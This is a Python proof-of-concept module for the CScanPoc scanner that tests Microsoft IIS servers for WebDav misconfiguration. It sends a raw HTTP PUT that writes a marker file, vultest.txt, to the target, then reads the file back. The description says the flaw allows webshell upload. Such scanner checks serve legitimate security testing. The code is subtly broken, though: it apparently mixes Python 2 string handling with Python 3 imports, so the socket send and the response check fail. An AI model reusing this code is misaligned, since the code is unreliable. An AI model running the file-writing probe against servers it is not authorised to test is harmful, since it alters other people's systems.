# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import socket
import time
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Microsoft-IIS_0006'  # 平台漏洞编号
    name = 'Microsoft-IIS WebDav 配置不当'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        开启了WebDav且配置不当可导致攻击者直接上传webshell，进而导致服务器被入侵控制。
    '''  # 漏洞描述
    ref = 'Unknown'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Microsoft-IIS'  # 漏洞组件名称
    product_version = 'IIS WebDav '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1414a6b9-f23a-4991-920a-4fd671c98940'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 10
            arg = '{target}'.format(target=self.target)
            url = urllib.parse.urlparse(arg)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ip = socket.gethostbyname(url.hostname)
            port = url.port if url.port else 80
            s.connect((ip, port))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\ncscan233\r\n\r\n" % (
                ip, port)
            s.send(flag)
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                vul_url = arg + '/vultest.txt'
                request = urllib.request.Request(vul_url)
                res_html = urllib.request.urlopen(
                    request, timeout=timeout).read(204800)
                if 'cscan233' in res_html:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
